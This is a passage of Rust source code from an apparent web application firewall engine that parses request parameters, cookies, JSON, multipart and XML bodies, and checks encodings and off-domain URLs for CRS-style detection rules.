use std::cell::{Cell, OnceCell, RefCell};
use std::collections::HashMap;
use std::rc::Rc;
use std::sync::Arc;

use sentinel_core::context::{
    InspectionLimit, InspectionLimits, Phase, RequestContext, RuleMatch, Severity, WafDecision,
};
use tracing::{debug, warn};

use super::emitter::{CompiledRuleSet, Instruction, RuleMeta, TargetSpec};
use crate::dsl::ast::{
    ExclusionKey, InterpCmp, RuleAction, RulePhase, RuleSeverity, SetVar, SetVarOp, Transform,
};

/// Whether `phase` inspects the response rather than the request.
fn is_response_phase(phase: &Phase) -> bool {
    matches!(phase, Phase::ResponseHeaders | Phase::ResponseBody)
}

/// Whether the rule scores the RESPONSE: it declares CRS's outbound anomaly
/// score (`setvar:tx.outbound_anomaly_score[_plN]=+N`).
fn scores_outbound(meta: &RuleMeta) -> bool {
    meta.setvars
        .iter()
        .any(|sv| sv.name.starts_with("OUTBOUND_ANOMALY_SCORE"))
}

fn rule_phase_to_phase(rp: RulePhase) -> Phase {
    match rp {
        RulePhase::Connection => Phase::Connection,
        RulePhase::RequestHeaders => Phase::RequestHeaders,
        RulePhase::RequestBody => Phase::RequestBody,
        RulePhase::Upstream => Phase::Upstream,
        RulePhase::ResponseHeaders => Phase::ResponseHeaders,
        RulePhase::ResponseBody => Phase::ResponseBody,
        RulePhase::Logging => Phase::Logging,
    }
}

// ---------------------------------------------------------------------------
// Stack value
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
enum StackVal {
    Bool(bool),
    /// Reference-counted because a memoized target is shared with
    /// `RequestViews`: loading ARGS must not copy every argument per rule.
    Strings(Rc<Vec<String>>),
    Int(i64),
    Float(f32),
    Absent,
}

// ---------------------------------------------------------------------------
// Target extraction helpers
// ---------------------------------------------------------------------------

/// Parse a URL-encoded query string into (key, value) pairs.
///
/// Lazily, so the pairs go straight into the lists that keep them rather than
/// through a list of pairs held alongside; see `Params::from_pairs`.
fn parse_query_params(query: &str) -> impl Iterator<Item = (String, String)> + '_ {
    query.split('&').filter(|kv| !kv.is_empty()).map(|kv| {
        let mut parts = kv.splitn(2, '=');
        // application/x-www-form-urlencoded + query-string semantics: '+'
        // encodes a space and must be replaced BEFORE percent-decoding (so a
        // literal '+' sent as %2B survives). Without this, payloads whose
        // spaces are '+'-encoded (the Go/GoTestWAF default) reach the rule
        // operators with literal '+' and evade @rx / @detectSQLi / @detectXSS.
        let k = percent_decode(&parts.next().unwrap_or("").replace('+', " "));
        let v = percent_decode(&parts.next().unwrap_or("").replace('+', " "));
        (k, v)
    })
}

/// `@validateUrlEncoding`: does this value contain malformed percent-encoding?
///
/// A `%` must be followed by exactly two hex digits. Anything else — a stray
/// `%`, `%zz`, or a `%` cut short by the end of the value — is what ModSecurity
/// calls URL-encoding abuse, and it matters because the WAF and the origin may
/// resolve the same bytes differently.
///
/// Scanned over BYTES: a multi-byte character cannot be a hex digit, and going
/// through `chars()` would only cost work.
fn has_invalid_url_encoding(s: &str) -> bool {
    let b = s.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' {
            // Two bytes must FOLLOW index i, so the last valid start is len-3.
            if i + 2 >= b.len() {
                return true; // truncated: "…%" or "…%A"
            }
            if !b[i + 1].is_ascii_hexdigit() || !b[i + 2].is_ascii_hexdigit() {
                return true;
            }
            i += 3;
        } else {
            i += 1;
        }
    }
    false
}

/// `@validateUtf8Encoding`: do this value's percent-escapes decode to something
/// that is not valid UTF-8?
///
/// Catches overlong forms (`%c0%af` for `/`, `%e0%80%80` for NUL), surrogate
/// halves (`%ed%a0%80`), truncated sequences and out-of-range lead bytes. These
/// are decoder-differential attacks: a filter comparing decoded ASCII sees
/// nothing, while the origin's decoder yields the dangerous character.
///
/// ⚠️ Two-part check, and the second part is a deliberate approximation.
/// `parse_query_params` decodes with `decode_utf8_lossy`, so by the time an
/// `ARGS` value reaches an operator its invalid bytes have ALREADY been replaced
/// by U+FFFD and the originals are unrecoverable. Validating only the escapes
/// (part 1) would therefore make this operator inert for the exact targets CRS
/// 920250 names — the "present but cannot fire" failure this change exists to
/// remove. So a residual U+FFFD is treated as evidence of that lossy decode.
///
/// The cost is a narrow false positive: a client that legitimately sends U+FFFD
/// (valid UTF-8: `EF BF BD`) is indistinguishable from one whose bytes were
/// mangled. Accepted because 920250 is WARNING severity, contributes 3 to an
/// anomaly score rather than blocking alone, and is gated off by CRS default.
fn has_invalid_utf8_encoding(s: &str) -> bool {
    if s.as_bytes().contains(&b'%') {
        let raw: Vec<u8> = percent_encoding::percent_decode_str(s).collect();
        if std::str::from_utf8(&raw).is_err() {
            return true;
        }
    }
    s.contains('\u{FFFD}')
}

fn percent_decode(s: &str) -> String {
    percent_encoding::percent_decode_str(s)
        .decode_utf8_lossy()
        .into_owned()
}

/// Decode both standard `%XX` and Microsoft IIS-style `%uXXXX` Unicode escapes.
/// Used by the `UrlDecodeUni` transform to match ModSecurity's `t:urlDecodeUni`.
///
/// One pass over the BYTES — `%XX` becomes that byte, `%uXXXX` the UTF-8 bytes
/// of its code point, a malformed escape (or a surrogate) stays literal, and
/// everything else is copied — then ONE lossy UTF-8 conversion. Decoding into
/// bytes first is what keeps a multi-byte character intact whether it arrives
/// escaped (`%C3%A9`) or raw (`é`).
///
/// The previous loop re-decoded the whole remainder of the value for every
/// `%` (quadratic: minutes on a 1 MB body of `%41`), turned `%C3%A9` into
/// `é` plus a stray U+FFFD, and pushed raw bytes as Latin-1 chars, so `é`
/// became `Ã©` whenever the value also held a `%`. An ASCII value whose `%XX`
/// escapes are all below `%80` comes out exactly as before; non-ASCII text and
/// high-byte escapes are what decode differently (correctly) now.
fn url_decode_uni(s: &str) -> String {
    // Fast path: if no `%`, nothing to decode.
    if !s.contains('%') {
        return s.to_owned();
    }

    let b = s.as_bytes();
    let hex = |i: usize| b.get(i).and_then(|&c| (c as char).to_digit(16));
    let mut out: Vec<u8> = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if b[i] == b'%' {
            if matches!(b.get(i + 1), Some(b'u' | b'U')) {
                // %uXXXX — exactly four hex digits naming a scalar value.
                let cp = (i + 2..i + 6).try_fold(0u32, |acc, j| Some((acc << 4) | hex(j)?));
                if let Some(ch) = cp.and_then(char::from_u32) {
                    out.extend_from_slice(ch.encode_utf8(&mut [0u8; 4]).as_bytes());
                    i += 6;
                    continue;
                }
            } else if let (Some(hi), Some(lo)) = (hex(i + 1), hex(i + 2)) {
                out.push(((hi << 4) | lo) as u8);
                i += 3;
                continue;
            }
        }
        out.push(b[i]);
        i += 1;
    }
    // Valid UTF-8 (the common case) is adopted without a second copy.
    String::from_utf8(out).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
}

/// Parse the Cookie header into (name, value) pairs.
fn parse_cookies(header_val: &str) -> Vec<(String, String)> {
    header_val
        .split(';')
        .map(|c| c.trim())
        .filter_map(|c| {
            let mut p = c.splitn(2, '=');
            Some((p.next()?.to_owned(), p.next().unwrap_or("").to_owned()))
        })
        .collect()
}

/// Lower-cased `Content-Type` value, or empty string if absent/unparsable.
fn content_type(ctx: &RequestContext) -> String {
    ctx.request_headers
        .get("content-type")
        .map(|ct| header_text(ct).to_ascii_lowercase())
        .unwrap_or_default()
}

/// The request's own Host header, lowercased, port stripped. Empty if absent.
fn request_host(ctx: &RequestContext) -> String {
    ctx.request_headers
        .get("host")
        .map(|v| {
            let h = header_text(v);
            h.split(':')
                .next()
                .unwrap_or(&h)
                .trim()
                .to_ascii_lowercase()
        })
        .unwrap_or_default()
}

/// A header value as text, decoded lossily. `to_str()` refuses any byte
/// 0x80 or above, and every target that used it dropped the WHOLE header — a single
/// such byte hid a header, or every cookie in it, from the rules.
fn header_text(v: &impl AsRef<[u8]>) -> std::borrow::Cow<'_, str> {
    String::from_utf8_lossy(v.as_ref())
}

/// Every value of request header `name`, as the rules read it. `Cookie` is one
/// value, its fields joined with `; ` as HTTP/1.1 carries it (RFC 9113
/// 8.2.3): HTTP/2 and HTTP/3 send a field per cookie, and reading only the
/// first left the rest unseen. Any other header yields one value per field.
fn request_header_values(ctx: &RequestContext, name: &str) -> Vec<String> {
    let fields = ctx
        .request_headers
        .get_all(name)
        .iter()
        .map(|v| header_text(v).into_owned());
    if name.eq_ignore_ascii_case("cookie") {
        let joined = fields.collect::<Vec<_>>().join("; ");
        return if joined.is_empty() {
            Vec::new()
        } else {
            vec![joined]
        };
    }
    fields.collect()
}

/// True if `value` contains a `scheme://host` URL whose host is off-domain
/// relative to `request_host` — i.e. not equal to it and not a subdomain of
/// it. Reproduces CRS 931130 (off-domain reference / RFI). When the request
/// has no Host header, any absolute URL counts as off-domain.
/// True if `value` parses as an IP address contained in any of `cidrs`.
///
/// Implements `@ipMatch` / `@ipMatchF`, which the CRS importer previously compiled to
/// `Operator::Never` — so every rule using them loaded successfully and could never
/// fire. Accepts a bare address (`10.0.0.1`) or a CIDR (`10.0.0.0/8`) in the rule
/// argument, and uses the SSRF module's permissive host parser so an attacker cannot
/// evade an allow/deny list by writing the same address in decimal or hex.
fn ip_in_any_cidr(value: &str, cidrs: &[String]) -> bool {
    let Some(ip) = crate::ssrf::parse_host_to_ip(value.trim()) else {
        return false;
    };
    cidrs.iter().any(|spec| {
        let spec = spec.trim();
        if spec.is_empty() {
            return false;
        }
        match spec.parse::<ipnet::IpNet>() {
            Ok(net) => net.contains(&ip),
            // A bare address is a /32 (or /128) — CRS rules write both forms.
            Err(_) => crate::ssrf::parse_host_to_ip(spec).is_some_and(|other| other == ip),
        }
    })
}

fn contains_off_domain_url(value: &str, request_host: &str) -> bool {
    let lower = value.to_ascii_lowercase();
    let mut search = lower.as_str();
    while let Some(pos) = search.find("://") {
        // Validate the scheme: alnum/+/-/. immediately before "://".
        let scheme: String = search[..pos]
            .chars()
            .rev()
            .take_while(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
            .collect();
        let scheme_ok = scheme
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic());

        let after = &search[pos + 3..];
        // Authority ends at the first path/query/fragment delimiter.
        let authority_end = after
            .find(['/', '?', '#', '\\', ' ', '\t', '"', '\''])
            .unwrap_or(after.len());
        let mut authority = &after[..authority_end];
        // Strip userinfo (`user:pass@`).
        if let Some(at) = authority.rfind('@') {
            authority = &authority[at + 1..];
        }
        // Strip a trailing `:port`.
        let host = authority.split(':').next().unwrap_or(authority);

        if scheme_ok && !host.is_empty() {
            if request_host.is_empty() {
                return true; // no own host → any absolute URL is off-domain
            }
            // On-domain iff host == own host, or host is a subdomain of it.
            let on_domain = host == request_host || host.ends_with(&format!(".{request_host}"));
            if !on_domain {
                return true;
            }
        }

        // Continue scanning past this occurrence.
        search = &search[pos + 3..];
    }
    false
}

/// A body parameter's name, shared by every value filed under it.
///
/// One name can carry any number of values — each element of a JSON array,
/// each text node of an XML element, each header line of a multipart part —
/// and a `String` per value copied it that many times: a 48 KB JSON body (a
/// 32 KB key over 8 K array elements) extracted 256 MB of names, and a 1 MB
/// one would need about 128 GB, an allocation abort no panic guard catches.
/// Shared, a repeat costs a reference count. Consumers that walk the names
/// key on the allocation ([`name_id`]) so they, too, do the work once per
/// name rather than once per value.
type ArgName = Arc<str>;

/// Identity of a shared name: the address of its text.
fn name_id(name: &ArgName) -> usize {
    name.as_ptr() as usize
}

/// Why a request's parameters cannot be listed in full.
///
/// Treated as a failure to inspect, never as an empty or a partial result:
/// either would pass what was not listed to the origin uninspected.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Unlisted {
    /// The body's JSON field names would exceed [`name_budget`].
    BodyTooComplex,
    /// The arguments exceed one of the site's inspection limits
    /// ([`InspectionLimit::Args`] or [`InspectionLimit::ArgBytes`]).
    OverLimit(InspectionLimit),
    /// A parsed body of this many bytes is more than REQUEST_BODY may read
    /// whole: [`WHOLE_BODY_FACTOR`] times `max_inspected_arg_bytes`.
    WholeBodyOverLimit(u64),
}

/// Why a request was refused for [`Unlisted::BodyTooComplex`].
const BODY_TOO_COMPLEX: &str =
    "request body could not be inspected: its JSON field names exceed the inspection limit";

/// How many bytes of DISTINCT parameter names a body of `body_len` bytes may
/// expand to: four times its size, plus 64 KiB so that a small, deeply nested
/// document always fits.
///
/// Only JSON can exceed it. Its names are paths (`a.b.c`), so a long key over
/// many distinct child keys spells itself out once per child: `{"<32 KB>":
/// {"a0":0,"a1":0,…}}` is a quadratic expansion that repeats cannot explain
/// and sharing cannot fix. An ordinary document stays far below: a name is at
/// most as many keys long as the document is deep. For scale, ModSecurity's
/// recommended configuration refuses any body with 1000 arguments or more.
fn name_budget(body_len: usize) -> usize {
    body_len.saturating_mul(4).saturating_add(64 * 1024)
}

/// The names one JSON body flattens to, built once each.
struct JsonNames<'a> {
    /// `(parent, key)` → the name `parent.key`. Keyed on the parent's
    /// identity rather than its text, so meeting a name again — every object
    /// in an array has the same keys — costs the key, not the whole path.
    /// Holding every name here also keeps each parent's address unique for as
    /// long as it is a key.
    known: HashMap<(usize, &'a str), ArgName>,
    /// Bytes of distinct names built so far, against `budget`.
    built: usize,
    budget: usize,
}

impl<'a> JsonNames<'a> {
    fn child(&mut self, parent: &ArgName, key: &'a str) -> Result<ArgName, Unlisted> {
        if let Some(name) = self.known.get(&(name_id(parent), key)) {
            return Ok(name.clone());
        }
        let name: ArgName = if parent.is_empty() {
            key.into()
        } else {
            format!("{parent}.{key}").into()
        };
        self.built += name.len();
        if self.built > self.budget {
            return Err(Unlisted::BodyTooComplex);
        }
        self.known.insert((name_id(parent), key), name.clone());
        Ok(name)
    }
}

/// Recursively flatten a JSON value into ModSecurity-style `(name, value)`
/// pairs.  Object keys become the parameter name; array elements inherit the
/// parent name (matching ModSecurity's `ARGS:json.path` behaviour closely
/// enough for detection).  Scalars are stringified; `null` is skipped.
fn flatten_json<'a>(
    name: &ArgName,
    val: &'a serde_json::Value,
    names: &mut JsonNames<'a>,
    out: &mut ParamsBuilder,
) -> Result<(), Unlisted> {
    use serde_json::Value;
    match val {
        Value::Object(map) => {
            for (k, v) in map {
                let key = names.child(name, k)?;
                flatten_json(&key, v, names, out)?;
            }
        }
        Value::Array(arr) => {
            for v in arr {
                // Array elements share the parent name (ModSecurity treats
                // repeated ARGS with the same name); keeps names meaningful.
                flatten_json(name, v, names, out)?;
            }
        }
        Value::String(s) => out.push_shared(name, s.clone())?,
        Value::Number(n) => out.push_shared(name, n.to_string())?,
        Value::Bool(b) => out.push_shared(name, b.to_string())?,
        Value::Null => {}
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// multipart/form-data parsing
// ---------------------------------------------------------------------------

/// Parsed components of a `multipart/form-data` request body.
#[derive(Default)]
struct MultipartParts {
    /// Non-file form fields.  These feed ARGS/ARGS_NAMES so injection delivered
    /// through a multipart form is inspected exactly like an
    /// `application/x-www-form-urlencoded` form — they ARE the body parameters
    /// of a multipart request; see `RequestViews::body`.
    fields: Params,
    /// Original client filenames (the `filename=` attribute). ModSec `FILES`.
    filenames: Vec<String>,
    /// Field names of file-upload parts (the `name=` attribute). ModSec
    /// `FILES_NAMES`.
    field_names: Vec<String>,
    /// Combined byte size of every file part's content. ModSec
    /// `FILES_COMBINED_SIZE`.
    combined_size: usize,
    /// Every part's header lines as `(part_name, header_line)`. ModSec
    /// `MULTIPART_PART_HEADERS`.
    ///
    /// One entry per header LINE, kept verbatim (not lowercased, not trimmed),
    /// because CRS 922 inspects these bytes directly: 922130 looks for bytes
    /// outside `\x21-\x7E` in a header name, so normalising here would erase the
    /// very anomaly it hunts for. `part_name` is the form-field name from
    /// Content-Disposition, or empty when the part declares none — one shared
    /// name per part, however many lines it has.
    part_headers: Vec<(ArgName, String)>,
}

/// How many times `max_inspected_arg_bytes` a parsed (non-multipart) body
/// may be when REQUEST_BODY rules read it whole.
///
/// Its arguments were charged as it was parsed, but its bytes need not be
/// arguments: encodings spell a byte of an argument in up to three
/// (`%E0`, `\u0928` for a 3-byte character) and markup sits between them
/// (`<qty>1</qty>`). They need not be arguments at all, either: an XML
/// comment, a JSON key repeated in every object of an array (a shared name is
/// charged once), nulls, whitespace. 10 MiB in one XML comment cost 4.0 s,
/// read whole under every argument limit. Four times the byte limit covers
/// any encoding with room for markup, and costs about what the arguments may.
const WHOLE_BODY_FACTOR: u64 = 4;

/// The length of `String::from_utf8_lossy(bytes)` — what a rule reading the
/// bytes as text reads — without building it: each invalid sequence becomes
/// U+FFFD, three bytes.
fn lossy_len(bytes: &[u8]) -> usize {
    bytes
        .utf8_chunks()
        .map(|c| c.valid().len() + if c.invalid().is_empty() { 0 } else { 3 })
        .sum()
}

/// Locate the first occurrence of `needle` within `haystack`, in time linear
/// in both.
///
/// Comparing `needle` at every offset cost their PRODUCT, and the needle can
/// be the boundary, which comes from the Content-Type header with no length
/// limit: a 64 KB boundary against 1 MB of `-` took 2.1 s per search. The
/// multipart parser also runs this over the whole body once per part.
fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() {
        return None;
    }
    memchr::memmem::find(haystack, needle)
}

/// Extract the `boundary` parameter from a `multipart/form-data` Content-Type.
/// The media type is matched case-insensitively, but the boundary value is
/// returned verbatim (boundaries are case-sensitive).  Note: ASCII-lowercasing
/// preserves byte length, so indices computed on the lowercased copy are valid
/// offsets into the original header value.
fn multipart_boundary(ctx: &RequestContext) -> Option<String> {
    let raw = header_text(ctx.request_headers.get("content-type")?);
    let raw: &str = &raw;
    let lower = raw.to_ascii_lowercase();
    if !lower.trim_start().starts_with("multipart/form-data") {
        return None;
    }
    let pos = lower.find("boundary=")? + "boundary=".len();
    let rest = raw[pos..].trim_start();
    let val = if let Some(stripped) = rest.strip_prefix('"') {
        stripped.split('"').next().unwrap_or("")
    } else {
        rest.split([';', ' ', '\t']).next().unwrap_or("")
    };
    (!val.is_empty()).then(|| val.to_owned())
}

/// Parse a `multipart/form-data` body into its constituent parts.  Malformed
/// or non-multipart bodies yield an empty result (fail-open on parse, but the
/// raw body is still reachable via `REQUEST_BODY` rules).
///
/// Fails when the parts pass `budget` (see [`ArgBudget`]): every field and
/// file part is an argument.
fn multipart_parts(ctx: &RequestContext, budget: ArgBudget) -> Result<MultipartParts, Unlisted> {
    let mut out = MultipartParts::default();
    let (Some(body), Some(boundary)) = (ctx.request_body.as_ref(), multipart_boundary(ctx)) else {
        return Ok(out);
    };
    let mut fields = ParamsBuilder::new(budget);
    let body: &[u8] = body;
    let delim = format!("--{boundary}");
    let delim = delim.as_bytes();
    // Built once: the delimiter is searched for once per part, and it can be
    // as long as the Content-Type header allows.
    let delim_finder = memchr::memmem::Finder::new(delim);

    // Position just past the first boundary marker.
    let mut search_from = match delim_finder.find(body) {
        Some(p) => p + delim.len(),
        None => return Ok(out),
    };
    loop {
        let after = &body[search_from..];
        // "--" immediately after a delimiter marks the closing boundary.
        if after.starts_with(b"--") {
            break;
        }
        // The part body begins after the CRLF that terminates the delimiter line.
        let part_start = match find_bytes(after, b"\r\n") {
            Some(p) => search_from + p + 2,
            None => break,
        };
        // The part runs up to the next boundary delimiter.
        let next = match delim_finder.find(&body[part_start..]) {
            Some(p) => part_start + p,
            None => break, // no closing delimiter — treat as malformed, stop
        };
        // Trim the CRLF that precedes the delimiter from the part content.
        let mut part_end = next;
        if part_end >= part_start + 2 && &body[part_end - 2..part_end] == b"\r\n" {
            part_end -= 2;
        }
        parse_one_part(&body[part_start..part_end], &mut out, &mut fields)?;
        search_from = next + delim.len();
    }
    out.fields = fields.finish();
    Ok(out)
}

/// Parse a single multipart part (its headers and content) and record it; a
/// non-file field goes to `fields`.
fn parse_one_part(
    part: &[u8],
    out: &mut MultipartParts,
    fields: &mut ParamsBuilder,
) -> Result<(), Unlisted> {
    let (headers, content) = match find_bytes(part, b"\r\n\r\n") {
        Some(p) => (&part[..p], &part[p + 4..]),
        None => (part, &b""[..]),
    };
    let headers = String::from_utf8_lossy(headers);
    let mut name: Option<String> = None;
    let mut filename: Option<String> = None;
    for line in headers.split("\r\n") {
        if line
            .to_ascii_lowercase()
            .trim_start()
            .starts_with("content-disposition:")
        {
            name = disposition_param(line, "name");
            filename = disposition_param(line, "filename");
            break;
        }
    }

    // The header lines, for MULTIPART_PART_HEADERS.
    //
    // Split on CRLF only, deliberately. A bare LF used as a header separator is
    // itself the smuggling trick rule 922130 exists to catch: keeping such a
    // line intact leaves the raw \n inside the value, where the rule's
    // out-of-range byte class matches it. Splitting on \n too would hide it.
    let lines = || headers.split("\r\n").filter(|line| !line.is_empty());
    // Every part is an argument, and its header lines are inspected (the 922
    // rules read them), so they count against the argument limits along with
    // what the part adds below. A part with no name cost nothing and header
    // lines were not counted, so 9.9 MiB of nameless parts or of padding
    // lines was parsed and inspected under any limit.
    let header_bytes: usize = lines().map(str::len).sum();
    match (&filename, &name) {
        // A file part's name and filename are inspected (FILES_NAMES, FILES);
        // its content is not, as no rule reads it.
        (Some(fname), _) => {
            fields.charge(header_bytes + name.as_ref().map_or(0, String::len) + fname.len())?
        }
        // `push` below charges the argument, its name and its value.
        (None, Some(_)) => fields.charge_bytes(header_bytes)?,
        (None, None) => fields.charge(header_bytes)?,
    }
    let part_label: ArgName = name.as_deref().unwrap_or_default().into();
    for line in lines() {
        out.part_headers.push((part_label.clone(), line.to_owned()));
    }
    match filename {
        // A part with a `filename` attribute is a file upload.
        Some(fname) => {
            out.filenames.push(fname);
            if let Some(n) = name {
                out.field_names.push(n);
            }
            out.combined_size += content.len();
        }
        // Otherwise it is a regular form field; its value feeds ARGS.
        None => {
            if let Some(n) = name {
                fields.push(n, String::from_utf8_lossy(content).into_owned())?;
            }
        }
    }
    Ok(())
}

/// Extract a `key="value"` (or unquoted `key=value`) parameter from a
/// Content-Disposition line.  The key is matched only on a token boundary
/// (start of line, or after `;`/whitespace) so that searching for `name`
/// does not match inside `filename`.
fn disposition_param(line: &str, key: &str) -> Option<String> {
    let lower = line.to_ascii_lowercase();
    let needle = format!("{key}=");
    let mut idx = 0usize;
    loop {
        let rel = lower[idx..].find(&needle)?;
        let at = idx + rel;
        let on_boundary = at == 0 || matches!(lower.as_bytes()[at - 1], b';' | b' ' | b'\t');
        if on_boundary {
            let rest = &line[at + needle.len()..];
            let val = if let Some(stripped) = rest.strip_prefix('"') {
                stripped.split('"').next().unwrap_or("")
            } else {
                rest.split([';', ' ', '\t']).next().unwrap_or("")
            };
            return Some(val.to_owned());
        }
        idx = at + needle.len();
    }
}

/// The parser a request body goes to, chosen by its (lower-cased)
/// Content-Type. Tested in this order, so a type that names two —
/// `multipart/form-data; boundary=a+json` — goes to the first.
#[derive(Clone, Copy, PartialEq, Eq)]
enum BodyParser {
    Urlencoded,
    Json,
    Multipart,
    Xml,
    /// No parser: the body reaches rules only as `REQUEST_BODY`.
    None,
}

fn body_parser(ct: &str) -> BodyParser {
    if ct.starts_with("application/x-www-form-urlencoded") {
        BodyParser::Urlencoded
    } else if ct.starts_with("application/json") || ct.contains("+json") {
        BodyParser::Json
    } else if ct.starts_with("multipart/form-data") {
        BodyParser::Multipart
    } else if is_xml_content_type(ct) {
        BodyParser::Xml
    } else {
        BodyParser::None
    }
}

/// Parse POST-body parameters into `(name, value)` pairs.
///
/// ModSecurity's `ARGS` collection merges query-string and POST-body
/// parameters; the rule engine must inspect both so that body-borne attacks
/// (the common case for login/search forms and JSON APIs) are not missed.
/// Supports `application/x-www-form-urlencoded` and `application/json`
/// (including `+json` suffixes such as `application/vnd.api+json`).
///
/// Called only through `RequestViews::body`, which builds it once per call.
/// A multipart body's parameters are its non-file form fields, which
/// `RequestViews::body` takes from the multipart view instead of copying.
///
/// A name shared by several values is held once (see [`ArgName`]). Fails for
/// a JSON body whose distinct names would exceed [`name_budget`], and for
/// parameters past `budget`, what the site's argument limits leave once the
/// query string is charged.
fn body_args(
    ctx: &RequestContext,
    parser: BodyParser,
    budget: ArgBudget,
) -> Result<Params, Unlisted> {
    let Some(body) = ctx.request_body.as_ref() else {
        return Ok(Params::default());
    };
    Ok(match parser {
        BodyParser::Urlencoded => {
            let text = String::from_utf8_lossy(body);
            Params::from_pairs(parse_query_params(&text), budget)?
        }
        BodyParser::Json => match serde_json::from_slice::<serde_json::Value>(body) {
            Ok(val) => {
                let mut names = JsonNames {
                    known: HashMap::new(),
                    built: 0,
                    budget: name_budget(body.len()),
                };
                let mut out = ParamsBuilder::new(budget);
                flatten_json(&ArgName::from(""), &val, &mut names, &mut out)?;
                out.finish()
            }
            // Malformed JSON: fall back to scanning the raw body as one value
            // so obfuscated/broken payloads still reach the regex operators.
            Err(_) => Params::from_pairs(
                [(String::new(), String::from_utf8_lossy(body).into_owned())],
                budget,
            )?,
        },
        // XML / SOAP bodies: surface element text, attribute values, and CDATA
        // into ARGS so payloads delivered inside XML reach the same operators
        // as form/JSON parameters (SOAP APIs are a common injection vector).
        BodyParser::Xml => parse_xml_args(body, budget)?,
        BodyParser::Multipart | BodyParser::None => Params::default(),
    })
}

/// True for XML and SOAP content types — `text/xml`, `application/xml`,
/// `application/soap+xml`, and any `…+xml` suffix (e.g. `application/rss+xml`).
fn is_xml_content_type(ct: &str) -> bool {
    ct.starts_with("text/xml")
        || ct.starts_with("application/xml")
        || ct.starts_with("application/soap+xml")
        || ct.contains("+xml")
}

/// Flatten an XML/SOAP body into ModSecurity-style `(name, value)` pairs.
///
/// This is a detection-oriented extractor, **not** a validating parser: it
/// surfaces every element's text content (keyed by the element's local name),
/// every attribute value (keyed by the attribute name), and every CDATA section
/// — decoding the standard XML entities — so injection delivered inside XML
/// reaches the ARGS operators. Comments, processing instructions, DOCTYPE
/// declarations, namespaces, and DTDs are ignored. Malformed input fails open
/// (extracts what it can). Byte offsets only ever land on ASCII delimiters
/// (`<`, `>`, `]]>`, …), so all `&str` slicing stays on char boundaries.
fn parse_xml_args(body: &[u8], budget: ArgBudget) -> Result<Params, Unlisted> {
    let text = String::from_utf8_lossy(body);
    let mut out = ParamsBuilder::new(budget);
    // One name per tag, shared by every text node and CDATA section under it:
    // a long element name over thousands of nodes (split apart by comments)
    // is held once, not once per node.
    let no_elem: ArgName = "".into();
    let mut cur_elem = no_elem.clone();
    let bytes = text.as_bytes();
    let mut i = 0;

    while i < bytes.len() {
        if bytes[i] != b'<' {
            // Text node — runs up to the next tag.
            let end = text[i..].find('<').map(|p| i + p).unwrap_or(bytes.len());
            let chunk = &text[i..end];
            if !chunk.trim().is_empty() {
                out.push_shared(&cur_elem, decode_xml_entities(chunk))?;
            }
            i = end;
            continue;
        }

        // A markup construct beginning at `<`.
        if text[i..].starts_with("<!--") {
            match text[i + 4..].find("-->") {
                Some(rel) => i += 4 + rel + 3,
                None => break,
            }
        } else if text[i..].starts_with("<![CDATA[") {
            let start = i + 9;
            match text[start..].find("]]>") {
                Some(rel) => {
                    let content = &text[start..start + rel];
                    if !content.trim().is_empty() {
                        out.push_shared(&cur_elem, content.to_owned())?;
                    }
                    i = start + rel + 3;
                }
                None => break,
            }
        } else if text[i..].starts_with("<?") || text[i..].starts_with("<!") {
            // Processing instruction / DOCTYPE / declaration — skip to `>`.
            match text[i..].find('>') {
                Some(rel) => i += rel + 1,
                None => break,
            }
        } else {
            // Element start or end tag.
            let Some(rel) = text[i + 1..].find('>') else {
                break;
            };
            let inner = text[i + 1..i + 1 + rel].trim();
            i = i + 1 + rel + 1;
            if let Some(_close) = inner.strip_prefix('/') {
                // Closing tag — the element's text context ends.
                cur_elem = no_elem.clone();
            } else {
                // Opening or self-closing tag: `name attr="v" .../`.
                let body_str = inner.trim_end_matches('/').trim();
                let name_end = body_str.find(char::is_whitespace).unwrap_or(body_str.len());
                cur_elem = local_name(&body_str[..name_end]).into();
                extract_xml_attributes(&body_str[name_end..], &mut out)?;
            }
        }
    }

    Ok(out.finish())
}

/// The local part of a possibly namespace-prefixed XML name
/// (`soap:Envelope` → `Envelope`).
fn local_name(raw: &str) -> &str {
    raw.rsplit(':').next().unwrap_or(raw)
}

/// Extract `name="value"` / `name='value'` attribute pairs from the portion of
/// a start tag after the element name, decoding XML entities in each value.
fn extract_xml_attributes(attrs: &str, out: &mut ParamsBuilder) -> Result<(), Unlisted> {
    let chars: Vec<char> = attrs.chars().collect();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        while i < n && chars[i].is_whitespace() {
            i += 1;
        }
        let name_start = i;
        while i < n && chars[i] != '=' && !chars[i].is_whitespace() {
            i += 1;
        }
        let name: String = chars[name_start..i].iter().collect();
        while i < n && chars[i].is_whitespace() {
            i += 1;
        }
        if i < n && chars[i] == '=' {
            i += 1;
            while i < n && chars[i].is_whitespace() {
                i += 1;
            }
            if i < n && (chars[i] == '"' || chars[i] == '\'') {
                let quote = chars[i];
                i += 1;
                let val_start = i;
                while i < n && chars[i] != quote {
                    i += 1;
                }
                let val: String = chars[val_start..i].iter().collect();
                if i < n {
                    i += 1; // consume the closing quote
                }
                if !name.is_empty() {
                    out.push(name, decode_xml_entities(&val))?;
                }
            }
        }
    }
    Ok(())
}

/// Decode the five predefined XML entities plus numeric character references
/// (`&#NN;` / `&#xHH;`). Unknown entities are left verbatim.
fn decode_xml_entities(s: &str) -> String {
    if !s.contains('&') {
        return s.to_owned();
    }
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(pos) = rest.find('&') {
        out.push_str(&rest[..pos]);
        let after = &rest[pos..];
        // The reference ends at the first `;` — unless another `&` comes first,
        // and then this `&` cannot start one (no entity contains `&`). Looking
        // for `;` alone rescanned the rest of the body for every `&`: quadratic
        // on an XML body full of `&` with no `;`.
        let semi = match after[1..].find([';', '&']) {
            Some(p) if after.as_bytes()[1 + p] == b';' => 1 + p,
            _ => {
                out.push('&');
                rest = &after[1..];
                continue;
            }
        };
        let entity = &after[1..semi];
        let decoded = match entity {
